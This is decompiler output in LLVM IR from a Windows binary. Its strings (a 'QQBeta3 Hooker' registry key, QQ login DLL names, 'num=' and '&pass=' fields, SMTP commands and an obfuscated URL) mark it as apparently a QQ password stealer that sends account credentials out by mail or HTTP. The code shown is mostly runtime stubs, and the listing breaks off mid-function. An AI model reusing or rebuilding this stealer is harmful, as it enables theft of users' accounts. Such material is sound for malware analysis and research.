source_filename = "test"
target datalayout = "e-p:32:32-f64:32:64-f80:32-n8:16:32-S128"

%_EXCEPTION_RECORD = type { i32, i32, %_EXCEPTION_RECORD*, i32*, i32, [1 x i32] }
%_EXCEPTION_POINTERS = type { %_EXCEPTION_RECORD*, %_CONTEXT* }
%_CONTEXT = type { i32, i32, i32, i32, i32, i32, i32, i32, i16, i16, i16, i16, i16, i16, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, [26 x %_M128A], i32, i32, i32, i32, i32, i32 }
%_M128A = type { i32, i64 }
%_OVERLAPPED = type { i32, i32, i32, i32* }
%_STARTUPINFOA = type { i32, i8*, i8*, i8*, i32, i32, i32, i32, i32, i32, i32, i32, i16, i16, i8*, i32*, i32*, i32* }
%_LARGE_INTEGER = type { i64 }
%_RTL_CRITICAL_SECTION = type { %_RTL_CRITICAL_SECTION_DEBUG*, i32, i32, i32*, i32*, i32 }
%_RTL_CRITICAL_SECTION_DEBUG = type { i16, i16, %_RTL_CRITICAL_SECTION*, %_LIST_ENTRY, i32, i32, i32, i16, i16 }
%_LIST_ENTRY = type { %_LIST_ENTRY*, %_LIST_ENTRY* }
%_SECURITY_ATTRIBUTES = type { i32, i32*, i1 }
%tagMSG = type { i32*, i32, i32, i32, i32, %tagPOINT }
%tagPOINT = type { i32, i32 }
%sockaddr = type { i16, [14 x i8] }
%in_addr = type { i32 }
%hostent = type { i8*, i8**, i16, i16, i8** }
%WSAData = type { i16, i16, i16, i16, i8*, [1 x i8], [1 x i8] }

@global_var_408000 = local_unnamed_addr global i32 0
@global_var_408094 = local_unnamed_addr global i32 0
@global_var_409658 = local_unnamed_addr global i32 0
@global_var_409660 = local_unnamed_addr global i32 0
@global_var_409664 = local_unnamed_addr global i32 0
@global_var_409678 = local_unnamed_addr global i32 0
@global_var_409674 = local_unnamed_addr global i32 0
@global_var_409670 = local_unnamed_addr global i32 0
@global_var_40966c = global i32 0
@global_var_409668 = global i32 0
@global_var_4080bc = global i32 4212308
@global_var_40967c = local_unnamed_addr global i32 0
@global_var_409680 = local_unnamed_addr global i32 0
@global_var_409684 = local_unnamed_addr global i32 0
@global_var_409688 = local_unnamed_addr global i32 0
@global_var_40968c = local_unnamed_addr global i32 0
@global_var_409690 = local_unnamed_addr global i32 0
@global_var_409694 = local_unnamed_addr global i32 0
@global_var_409698 = local_unnamed_addr global i32 0
@global_var_40969c = local_unnamed_addr global i32 0
@global_var_4096a0 = local_unnamed_addr global i32 0
@global_var_4096a4 = local_unnamed_addr global i32 0
@global_var_404ebc = local_unnamed_addr constant i32 43
@global_var_404ed4 = constant i32 37
@global_var_404f5c = local_unnamed_addr constant i32 63
@global_var_4096a8 = local_unnamed_addr global i32 0
@global_var_405020 = local_unnamed_addr constant [3 x i8] c"mz\00"
@global_var_405024 = constant [27 x i8] c"Software\5Cmz\5CQQBeta3 Hooker\00"
@global_var_4080f8 = global i32 1
@global_var_405040 = constant [10 x i8] c"First Run\00"
@global_var_4050fc = constant [27 x i8] c"Software\5Cmz\5CQQBeta3 Hooker\00"
@global_var_405118 = constant [10 x i8] c"First Run\00"
@global_var_408138 = external local_unnamed_addr global i32
@global_var_4080c0 = local_unnamed_addr global i32 0
@global_var_4080e8 = global i32 4213696
@global_var_4080f4 = local_unnamed_addr global i32 66
@global_var_4080cc = local_unnamed_addr global i32 4212320
@global_var_4080c8 = local_unnamed_addr global i32 0
@global_var_4080e4 = global i32 4213628
@global_var_4080dc = local_unnamed_addr global i32 4213492
@global_var_4080f0 = global i32 4230401
@global_var_4051c4 = local_unnamed_addr constant [16 x i8] c"xr, wo xiang ni\00"
@global_var_4051d4 = local_unnamed_addr constant [8 x i8] c"ListBox\00"
@global_var_4096ac = local_unnamed_addr global i32 0
@global_var_40813c = external local_unnamed_addr global i32
@global_var_405498 = constant [9 x i8] c"ComboBox\00"
@global_var_408140 = external local_unnamed_addr global i32
@global_var_40812c = external local_unnamed_addr global i32
@global_var_4080c4 = local_unnamed_addr global i32 0
@global_var_4080d8 = global i32 4213424
@global_var_4096b4 = local_unnamed_addr global i32 0
@global_var_4096b8 = local_unnamed_addr global i32 0
@global_var_4096b0 = local_unnamed_addr global i32 0
@global_var_4080fc = local_unnamed_addr global i32 4216296
@B64EncodeTable_at_4055e8 = constant [64 x i8] c"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
@global_var_405cc0 = constant [6 x i8] c"HELO \00"
@global_var_405cd0 = constant [3 x i8] c"\0D\0A\00"
@global_var_405cdc = local_unnamed_addr constant [13 x i8] c"AUTH LOGIN\0D\0A\00"
@global_var_405cf4 = constant [13 x i8] c"MAIL FROM: <\00"
@global_var_405d0c = constant i32 62
@global_var_405d18 = constant [11 x i8] c"RCPT TO: <\00"
@global_var_405d2c = local_unnamed_addr constant [7 x i8] c"DATA\0D\0A\00"
@global_var_405d3c = constant [8 x i8] c"From: <\00"
@global_var_405d4c = constant [6 x i8] c"To: <\00"
@global_var_405d5c = constant [10 x i8] c"Subject: \00"
@global_var_405d70 = constant i32 46
@global_var_4096c0 = local_unnamed_addr global i32 0
@global_var_405d7c = local_unnamed_addr constant [7 x i8] c"QUIT\0D\0A\00"
@global_var_4096bc = local_unnamed_addr global i32 0
@global_var_405dc6 = local_unnamed_addr constant i32 763609949
@global_var_405ee8 = constant [7 x i8] c"#32770\00"
@global_var_405ef8 = local_unnamed_addr constant [7 x i8] c"Button\00"
@global_var_4096c4 = local_unnamed_addr global i32 0
@global_var_4096cc = local_unnamed_addr global i32 0
@global_var_405f44 = local_unnamed_addr constant i32 4218696
@global_var_405f48 = local_unnamed_addr constant i32 841875985
@global_var_4096c8 = local_unnamed_addr global i32 0
@global_var_408100 = local_unnamed_addr global i32 4218988
@global_var_408128 = local_unnamed_addr global i32* @global_var_4080bc
@global_var_4096d0 = local_unnamed_addr global i32 0
@global_var_408154 = external local_unnamed_addr global i32
@global_var_406268 = local_unnamed_addr constant [3 x i8] c"rr\00"
@global_var_408104 = local_unnamed_addr global i32 0
@global_var_408148 = external local_unnamed_addr global i32
@global_var_408108 = local_unnamed_addr global i32 0
@global_var_4096d4 = local_unnamed_addr global i32 0
@global_var_4080ec = global i32 4213764
@global_var_408124 = local_unnamed_addr global i32* @global_var_4080ec
@global_var_406580 = constant [6 x i8] c"Down(\00"
@global_var_406590 = constant i32 41
@global_var_40659c = local_unnamed_addr constant [4 x i8] c"c:\5C\00"
@global_var_4065a0 = constant [5 x i8] c"Open\00"
@global_var_4096d8 = global i32 0
@global_var_406864 = local_unnamed_addr constant [3 x i8] c"\0D\0A\00"
@global_var_4080e0 = local_unnamed_addr global i32 4213560
@global_var_406870 = constant i32 47
@global_var_4068b0 = local_unnamed_addr constant i32 64
@global_var_408158 = local_unnamed_addr global i32* @global_var_4080e4
@global_var_408144 = local_unnamed_addr global i32* @global_var_4080e8
@global_var_4068bc = constant [5 x i8] c"num=\00"
@global_var_4068cc = constant [7 x i8] c"&pass=\00"
@global_var_408134 = local_unnamed_addr global i32* @global_var_4080d8
@global_var_4068dc = local_unnamed_addr constant [35 x i8] c"iuuq;00uftu=43992=dpn0uftu0ofx=btq\00"
@global_var_4069b4 = local_unnamed_addr constant [16 x i8] c"xr, wo xiang ni\00"
@global_var_4069c4 = local_unnamed_addr constant [8 x i8] c"ListBox\00"
@global_var_406ad4 = local_unnamed_addr constant [16 x i8] c"xr, wo xiang ni\00"
@global_var_406ae4 = local_unnamed_addr constant [8 x i8] c"ListBox\00"
@global_var_408130 = local_unnamed_addr global i32* @global_var_409668
@global_var_406aec = local_unnamed_addr constant [13 x i8] c"xr, wo ai ni\00"
@global_var_4096e0 = local_unnamed_addr global i32 0
@global_var_4096dc = local_unnamed_addr global i32 0
@global_var_4096e8 = local_unnamed_addr global i32 0
@global_var_408150 = local_unnamed_addr global i32* @global_var_40966c
@global_var_406db8 = local_unnamed_addr constant [11 x i8] c"joipor.obj\00"
@global_var_406dcc = local_unnamed_addr constant [3 x i8] c"\0D\0A\00"
@global_var_406dd8 = local_unnamed_addr constant i32 47
@global_var_406bc4 = local_unnamed_addr constant i32 4221896
@global_var_406bc8 = local_unnamed_addr constant i32 841875985
@global_var_406ef8 = local_unnamed_addr constant [11 x i8] c"joipor.obj\00"
@global_var_406f0c = constant i32 47
@global_var_406f18 = constant [3 x i8] c"\0D\0A\00"
@global_var_4096e4 = local_unnamed_addr global i32 0
@global_var_4074f0 = local_unnamed_addr constant [7 x i8] c"#32770\00"
@global_var_40759c = local_unnamed_addr constant [5 x i8] c"Edit\00"
@global_var_407724 = local_unnamed_addr constant [3 x i8] c"rr\00"
@global_var_408160 = local_unnamed_addr global i32* @global_var_4080f0
@global_var_407730 = local_unnamed_addr constant [3 x i8] c"\0D\0A\00"
@global_var_408120 = local_unnamed_addr global i32* @global_var_4096d8
@global_var_40810c = local_unnamed_addr global i32 0
@global_var_408110 = local_unnamed_addr global i32 0
@global_var_4078e8 = local_unnamed_addr constant [33 x i8] c"http://jump.qq.com/clienturl_157\00"
@global_var_40790c = constant [33 x i8] c"http://jump.qq.com/clienturl_156\00"
@global_var_408114 = local_unnamed_addr global i32 0
@global_var_4079a0 = constant [11 x i8] c"user32.dll\00"
@global_var_4079ac = constant [11 x i8] c"LoadImageA\00"
@global_var_4079b8 = local_unnamed_addr constant [14 x i8] c"LoginCtrl.DLL\00"
@global_var_4047c0 = local_unnamed_addr constant i32 4212748
@global_var_40480c = local_unnamed_addr constant i32 1867011080
@global_var_4079c8 = constant [12 x i8] c"LoadStringA\00"
@global_var_4079d4 = local_unnamed_addr constant [10 x i8] c"MFC42.DLL\00"
@global_var_4079e0 = constant [12 x i8] c"shell32.dll\00"
@global_var_4079ec = constant [14 x i8] c"ShellExecuteA\00"
@global_var_4079fc = local_unnamed_addr constant [16 x i8] c"QQHELPERDLL.DLL\00"
@global_var_40810d = local_unnamed_addr global i32 0
@global_var_4096ec = local_unnamed_addr global i32 0
@global_var_407a98 = local_unnamed_addr constant i32 28
@global_var_409800 = local_unnamed_addr global i32 0
@global_var_409804 = local_unnamed_addr global i32 0
@global_var_4097fc = local_unnamed_addr global i32 0
@global_var_407e38 = local_unnamed_addr constant [7 x i8] c"QQ.exe\00"
@global_var_4097f8 = local_unnamed_addr global i32 0
@global_var_407e48 = local_unnamed_addr constant [13 x i8] c"npkcrypt.sys\00"
@global_var_407e60 = local_unnamed_addr constant [14 x i8] c"LoginCtrl.dll\00"
@global_var_408118 = local_unnamed_addr global i32 0
@global_var_407e78 = local_unnamed_addr constant [13 x i8] c"Fyqmpsfs=fyf\00"
@global_var_407e88 = constant [16 x i8] c"xr, wo xiang ni\00"
@global_var_407e98 = constant [8 x i8] c"ListBox\00"
@global_var_409808 = global i32 0
@global_var_407ea8 = local_unnamed_addr constant [3 x i8] c"rr\00"
@global_var_409654 = local_unnamed_addr global i32 0
@0 = external global i32
@global_var_4095ac = local_unnamed_addr global i8 0
@1 = internal constant [12 x i8] c"aixiaran\B0J@\00"
@global_var_4080d0 = global i8* getelementptr inbounds ([12 x i8], [12 x i8]* @1, i32 0, i32 0)
@global_var_409650 = local_unnamed_addr global i32 (i32, i32, i32)* null
@global_var_4096f0 = external global i8*

declare i32 @unknown_50a0() local_unnamed_addr

declare i32 @unknown_5178() local_unnamed_addr

define i32* @GetStdHandle.19(i32 %nStdHandle) local_unnamed_addr {
dec_label_pc_401060:
  %0 = call i32* @GetStdHandle(i32 %nStdHandle), !insn.addr !0
  ret i32* %0, !insn.addr !0
}

define void @RaiseException.40(i32 %dwExceptionCode, i32 %dwExceptionFlags, i32 %nNumberOfArguments, i32* %lpArguments) local_unnamed_addr {
dec_label_pc_401068:
  call void @RaiseException(i32 %dwExceptionCode, i32 %dwExceptionFlags, i32 %nNumberOfArguments, i32* %lpArguments), !insn.addr !1
  ret void, !insn.addr !1
}

define void @RtlUnwind.41(i32* %TargetFrame, i32* %TargetIp, %_EXCEPTION_RECORD* %ExceptionRecord, i32* %ReturnValue) local_unnamed_addr {
dec_label_pc_401070:
  call void @RtlUnwind(i32* %TargetFrame, i32* %TargetIp, %_EXCEPTION_RECORD* %ExceptionRecord, i32* %ReturnValue), !insn.addr !2
  ret void, !insn.addr !2
}

define i32 @UnhandledExceptionFilter.33(%_EXCEPTION_POINTERS* %ExceptionInfo) local_unnamed_addr {
dec_label_pc_401078:
  %0 = call i32 @UnhandledExceptionFilter(%_EXCEPTION_POINTERS* %ExceptionInfo), !insn.addr !3
  ret i32 %0, !insn.addr !3
}

define i1 @WriteFile.20(i32* %hFile, i32* %lpBuffer, i32 %nNumberOfBytesToWrite, i32* %lpNumberOfBytesWritten, %_OVERLAPPED* %lpOverlapped) local_unnamed_addr {
dec_label_pc_401080:
  %0 = call i1 @WriteFile(i32* %hFile, i32* %lpBuffer, i32 %nNumberOfBytesToWrite, i32* %lpNumberOfBytesWritten, %_OVERLAPPED* %lpOverlapped), !insn.addr !4
  ret i1 %0, !insn.addr !4
}

define void @ExitProcess.18(i32 %uExitCode) local_unnamed_addr {
dec_label_pc_401088:
  call void @ExitProcess(i32 %uExitCode), !insn.addr !5
  ret void, !insn.addr !5
}

define i32 @MessageBox(i32* %hWnd, i8* %lpText, i8* %lpCaption, i32 %uType) local_unnamed_addr {
dec_label_pc_401090:
  %0 = call i32 @MessageBoxA(i32* %hWnd, i8* %lpText, i8* %lpCaption, i32 %uType), !insn.addr !6
  ret i32 %0, !insn.addr !6
}

define i1 @FreeLibrary.17(i32* %hLibModule) local_unnamed_addr {
dec_label_pc_401098:
  %0 = call i1 @FreeLibrary(i32* %hLibModule), !insn.addr !7
  ret i1 %0, !insn.addr !7
}

define i8* @GetCommandLine() local_unnamed_addr {
dec_label_pc_4010a0:
  %0 = call i8* @GetCommandLineA(), !insn.addr !8
  ret i8* %0, !insn.addr !8
}

define i32 @GetLocaleInfo(i32 %Locale, i32 %LCType, i8* %lpLCData, i32 %cchData) local_unnamed_addr {
dec_label_pc_4010a8:
  %0 = call i32 @GetLocaleInfoA(i32 %Locale, i32 %LCType, i8* %lpLCData, i32 %cchData), !insn.addr !9
  ret i32 %0, !insn.addr !9
}

define void @GetStartupInfo(%_STARTUPINFOA* %lpStartupInfo) local_unnamed_addr {
dec_label_pc_4010b0:
  call void @GetStartupInfoA(%_STARTUPINFOA* %lpStartupInfo), !insn.addr !10
  ret void, !insn.addr !10
}

define i32 @GetThreadLocale.35() local_unnamed_addr {
dec_label_pc_4010b8:
  %0 = call i32 @GetThreadLocale(), !insn.addr !11
  ret i32 %0, !insn.addr !11
}

define i32 @RegCloseKey.32(i32* %hKey) local_unnamed_addr {
dec_label_pc_4010c0:
  %0 = call i32 @RegCloseKey(i32* %hKey), !insn.addr !12
  ret i32 %0, !insn.addr !12
}

define i32 @RegOpenKeyEx(i32* %hKey, i8* %lpSubKey, i32 %ulOptions, i32 %samDesired, i32** %phkResult) local_unnamed_addr {
dec_label_pc_4010c8:
  %0 = call i32 @RegOpenKeyExA(i32* %hKey, i8* %lpSubKey, i32 %ulOptions, i32 %samDesired, i32** %phkResult), !insn.addr !13
  ret i32 %0, !insn.addr !13
}

define i32 @RegQueryValueEx(i32* %hKey, i8* %lpValueName, i32* %lpReserved, i32* %lpType, i8* %lpData, i32* %lpcbData) local_unnamed_addr {
dec_label_pc_4010d0:
  %0 = call i32 @RegQueryValueExA(i32* %hKey, i8* %lpValueName, i32* %lpReserved, i32* %lpType, i8* %lpData, i32* %lpcbData), !insn.addr !14
  ret i32 %0, !insn.addr !14
}

define i32 @SysReAllocStringLen.25(i16** %pbstr, i16* %psz, i32 %len) local_unnamed_addr {
dec_label_pc_4010d8:
  %0 = call i32 @SysReAllocStringLen(i16** %pbstr, i16* %psz, i32 %len), !insn.addr !15
  ret i32 %0, !insn.addr !15
}

define void @SysFreeString.26(i16* %bstrString) local_unnamed_addr {
dec_label_pc_4010e0:
  call void @SysFreeString(i16* %bstrString), !insn.addr !16
  ret void, !insn.addr !16
}

define i32 @GetCurrentThreadId.36() local_unnamed_addr {
dec_label_pc_4010e8:
  %0 = call i32 @GetCurrentThreadId(), !insn.addr !17
  ret i32 %0, !insn.addr !17
}

define i32 @GetVersion.34() local_unnamed_addr {
dec_label_pc_4010f0:
  %0 = call i32 @GetVersion(), !insn.addr !18
  ret i32 %0, !insn.addr !18
}

define i1 @QueryPerformanceCounter.29(%_LARGE_INTEGER* %lpPerformanceCount) local_unnamed_addr {
dec_label_pc_4010f8:
  %0 = call i1 @QueryPerformanceCounter(%_LARGE_INTEGER* %lpPerformanceCount), !insn.addr !19
  ret i1 %0, !insn.addr !19
}

define i32 @GetTickCount.30() local_unnamed_addr {
dec_label_pc_401100:
  %0 = call i32 @GetTickCount(), !insn.addr !20
  ret i32 %0, !insn.addr !20
}

define i32* @LocalAlloc.15(i32 %uFlags, i32 %uBytes) local_unnamed_addr {
dec_label_pc_40112c:
  %0 = call i32* @LocalAlloc(i32 %uFlags, i32 %uBytes), !insn.addr !21
  ret i32* %0, !insn.addr !21
}

define i32* @LocalFree.27(i32* %hMem) local_unnamed_addr {
dec_label_pc_401134:
  %0 = call i32* @LocalFree(i32* %hMem), !insn.addr !22
  ret i32* %0, !insn.addr !22
}

define i32* @VirtualAlloc.21(i32* %lpAddress, i32 %dwSize, i32 %flAllocationType, i32 %flProtect) local_unnamed_addr {
dec_label_pc_40113c:
  %0 = call i32* @VirtualAlloc(i32* %lpAddress, i32 %dwSize, i32 %flAllocationType, i32 %flProtect), !insn.addr !23
  ret i32* %0, !insn.addr !23
}

define i1 @VirtualFree.16(i32* %lpAddress, i32 %dwSize, i32 %dwFreeType) local_unnamed_addr {
dec_label_pc_401144:
  %0 = call i1 @VirtualFree(i32* %lpAddress, i32 %dwSize, i32 %dwFreeType), !insn.addr !24
  ret i1 %0, !insn.addr !24
}

define void @InitializeCriticalSection.14(%_RTL_CRITICAL_SECTION* %lpCriticalSection) local_unnamed_addr {
dec_label_pc_40114c:
  call void @InitializeCriticalSection(%_RTL_CRITICAL_SECTION* %lpCriticalSection), !insn.addr !25
  ret void, !insn.addr !25
}

define void @EnterCriticalSection.12(%_RTL_CRITICAL_SECTION* %lpCriticalSection) local_unnamed_addr {
dec_label_pc_401154:
  call void @EnterCriticalSection(%_RTL_CRITICAL_SECTION* %lpCriticalSection), !insn.addr !26
  ret void, !insn.addr !26
}

define void @LeaveCriticalSection.13(%_RTL_CRITICAL_SECTION* %lpCriticalSection) local_unnamed_addr {
dec_label_pc_40115c:
  call void @LeaveCriticalSection(%_RTL_CRITICAL_SECTION* %lpCriticalSection), !insn.addr !27
  ret void, !insn.addr !27
}

define void @DeleteCriticalSection.28(%_RTL_CRITICAL_SECTION* %lpCriticalSection) local_unnamed_addr {
dec_label_pc_401164:
  call void @DeleteCriticalSection(%_RTL_CRITICAL_SECTION* %lpCriticalSection), !insn.addr !28
  ret void, !insn.addr !28
}

define i32 @InitAllocator.42() local_unnamed_addr {
dec_label_pc_4018ae:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !29
  ret i32 %0, !insn.addr !29
}

define i32 @function_4018b3() local_unnamed_addr {
dec_label_pc_4018b3:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !30
}

define i32 @function_4018b5(i32 %arg1) local_unnamed_addr {
dec_label_pc_4018b5:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i8, i8* @global_var_4095ac, align 1, !insn.addr !31
  %2 = zext i8 %1 to i32, !insn.addr !31
  %3 = and i32 %0, -256, !insn.addr !31
  %4 = or i32 %3, %2, !insn.addr !31
  ret i32 %4, !insn.addr !32
}

define i32 @SysGetMem.43() local_unnamed_addr {
dec_label_pc_402060:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !33
  ret i32 %0, !insn.addr !33
}

define i32 @function_402065() local_unnamed_addr {
dec_label_pc_402065:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !34
}

define i32 @function_402067(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_402067:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = add i32 %0, -4, !insn.addr !35
  %2 = inttoptr i32 %1 to i32*, !insn.addr !35
  %3 = load i32, i32* %2, align 4, !insn.addr !35
  ret i32 %3, !insn.addr !36
}

define i32 @SysFreeMem.44() local_unnamed_addr {
dec_label_pc_402206:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !37
  ret i32 %0, !insn.addr !37
}

define i32 @function_40220b() local_unnamed_addr {
dec_label_pc_40220b:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !38
}

define i32 @function_40220d(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_40220d:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = add i32 %0, -4, !insn.addr !39
  %2 = inttoptr i32 %1 to i32*, !insn.addr !39
  %3 = load i32, i32* %2, align 4, !insn.addr !39
  ret i32 %3, !insn.addr !40
}

define i32 @SysReallocMem.45() local_unnamed_addr {
dec_label_pc_4024a5:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !41
  ret i32 %0, !insn.addr !41
}

define i32 @function_4024aa() local_unnamed_addr {
dec_label_pc_4024aa:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !42
}

define i32 @function_4024ac(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_4024ac:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = add i32 %0, -4, !insn.addr !43
  %2 = inttoptr i32 %1 to i32*, !insn.addr !43
  %3 = load i32, i32* %2, align 4, !insn.addr !43
  ret i32 %3, !insn.addr !44
}

define i32 @function_402553() local_unnamed_addr {
dec_label_pc_402553:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !45
}

define i32 @function_40259b(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_40259b:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !46
}

define i32 @function_4025ab() local_unnamed_addr {
dec_label_pc_4025ab:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !47
}

declare i32 @Move() local_unnamed_addr

declare i32 @"@PStrNCpy"() local_unnamed_addr

declare i32 @"@FillChar"() local_unnamed_addr

declare i32 @"@Str0Long"(i32, i32) local_unnamed_addr

define i32 @GetKeyboardType.31(i32 %nTypeFlag) local_unnamed_addr {
dec_label_pc_4028b0:
  %0 = call i32 @GetKeyboardType(i32 %nTypeFlag), !insn.addr !48
  ret i32 %0, !insn.addr !48
}

define i32 @function_402ab4() local_unnamed_addr {
dec_label_pc_402ab4:
  ret i32 -2147418113, !insn.addr !49
}

define i32 @function_402abc() local_unnamed_addr {
dec_label_pc_402abc:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !50
}

define i32 @function_402ac0() local_unnamed_addr {
dec_label_pc_402ac0:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !51
}

define i32 @function_402ac4() local_unnamed_addr {
dec_label_pc_402ac4:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !52
}

define i32 @function_402aee() local_unnamed_addr {
dec_label_pc_402aee:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !53
}

declare i32 @"@ClassCreate"(i32, i32, i32, i32, i32) local_unnamed_addr

define i32 @"@ClassCreate.46"() local_unnamed_addr {
dec_label_pc_402b19:
  %0 = call i32 @"@HandleAnyException"(), !insn.addr !54
  ret i32 %0, !insn.addr !54
}

define i32 @function_402b1e(i32 %arg1) local_unnamed_addr {
dec_label_pc_402b1e:
  %0 = add i32 %arg1, 12, !insn.addr !55
  %1 = inttoptr i32 %0 to i32*, !insn.addr !55
  %2 = load i32, i32* %1, align 4, !insn.addr !55
  %3 = icmp eq i32 %2, 0, !insn.addr !56
  br i1 %3, label %dec_label_pc_402b37, label %dec_label_pc_402b29, !insn.addr !57

dec_label_pc_402b29:                              ; preds = %dec_label_pc_402b1e
  %4 = call i32 @"@ClassDestroy"(), !insn.addr !58
  br label %dec_label_pc_402b37, !insn.addr !58

dec_label_pc_402b37:                              ; preds = %dec_label_pc_402b29, %dec_label_pc_402b1e
  %5 = call i32 @"@RaiseAgain"(), !insn.addr !59
  ret i32 %5, !insn.addr !60
}

declare i32 @"@ClassDestroy"() local_unnamed_addr

define i32 @function_402b48() local_unnamed_addr {
dec_label_pc_402b48:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !61
}

declare i32 @"@BeforeDestruction"(i32, i32) local_unnamed_addr

declare i32 @"@HandleAnyException"() local_unnamed_addr

declare i32 @"@HandleFinally"() local_unnamed_addr

declare i32 @"@RaiseAgain"() local_unnamed_addr

define i32 @function_402e3f() local_unnamed_addr {
dec_label_pc_402e3f:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !62
}

define i32 @function_402e55() local_unnamed_addr {
dec_label_pc_402e55:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !63
}

define i32 @function_402ef4(i32 %arg1) local_unnamed_addr {
dec_label_pc_402ef4:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !64
}

define i32 @function_403167() local_unnamed_addr {
dec_label_pc_403167:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !65
}

define i32 @function_4031f1() local_unnamed_addr {
dec_label_pc_4031f1:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !66
}

declare i32 @"@Halt0"() local_unnamed_addr

define i32 @function_403353(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_403353:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !67
}

define i32 @"@Halt"() local_unnamed_addr {
dec_label_pc_403358:
  %0 = call i32 @"@Halt0"(), !insn.addr !68
  unreachable, !insn.addr !68
}

define i32 @function_403362() local_unnamed_addr {
dec_label_pc_403362:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !69
}

define i32 @function_40336f() local_unnamed_addr {
dec_label_pc_40336f:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !70
}

declare i32 @"@LStrClr"() local_unnamed_addr

declare i32 @"@LStrArrayClr"() local_unnamed_addr

declare i32 @"@LStrAsg"() local_unnamed_addr

declare i32 @"@LStrFromChar"() local_unnamed_addr

declare i32 @"@LStrFromPChar"() local_unnamed_addr

define i32 @function_4034a0() local_unnamed_addr {
dec_label_pc_4034a0:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !71
}

declare i32 @"@LStrFromString"() local_unnamed_addr

define i32 @function_4034ae() local_unnamed_addr {
dec_label_pc_4034ae:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !72
}

declare i32 @"@LStrFromArray"() local_unnamed_addr

define i32 @function_4034c7() local_unnamed_addr {
dec_label_pc_4034c7:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !73
}

define i32 @function_4034c8() local_unnamed_addr {
dec_label_pc_4034c8:
  %eax.0.reg2mem = alloca i32, !insn.addr !74
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = icmp eq i32 %0, 0, !insn.addr !74
  store i32 0, i32* %eax.0.reg2mem, !insn.addr !75
  br i1 %1, label %dec_label_pc_4034cf, label %dec_label_pc_4034cc, !insn.addr !75

dec_label_pc_4034cc:                              ; preds = %dec_label_pc_4034c8
  %2 = add i32 %0, -4, !insn.addr !76
  %3 = inttoptr i32 %2 to i32*, !insn.addr !76
  %4 = load i32, i32* %3, align 4, !insn.addr !76
  store i32 %4, i32* %eax.0.reg2mem, !insn.addr !76
  br label %dec_label_pc_4034cf, !insn.addr !76

dec_label_pc_4034cf:                              ; preds = %dec_label_pc_4034cc, %dec_label_pc_4034c8
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  ret i32 %eax.0.reload, !insn.addr !77
}

declare i32 @"@LStrCat"() local_unnamed_addr

declare i32 @"@LStrCat3"() local_unnamed_addr

define i32 @function_403587() local_unnamed_addr {
dec_label_pc_403587:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !78
}

declare i32 @"@LStrCatN"() local_unnamed_addr

define i32 @function_403611() local_unnamed_addr {
dec_label_pc_403611:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !79
}

declare i32 @"@LStrCmp"() local_unnamed_addr

define i32 @function_4036b8() local_unnamed_addr {
dec_label_pc_4036b8:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = icmp eq i32 %0, 0, !insn.addr !80
  br i1 %1, label %dec_label_pc_4036c6, label %dec_label_pc_4036bc, !insn.addr !81

dec_label_pc_4036bc:                              ; preds = %dec_label_pc_4036b8
  %2 = add i32 %0, -8, !insn.addr !82
  %3 = inttoptr i32 %2 to i32*, !insn.addr !82
  %4 = load i32, i32* %3, align 4, !insn.addr !82
  %5 = add i32 %4, 1, !insn.addr !83
  %6 = icmp slt i32 %5, 1, !insn.addr !84
  br i1 %6, label %dec_label_pc_4036c6, label %dec_label_pc_4036c2, !insn.addr !84

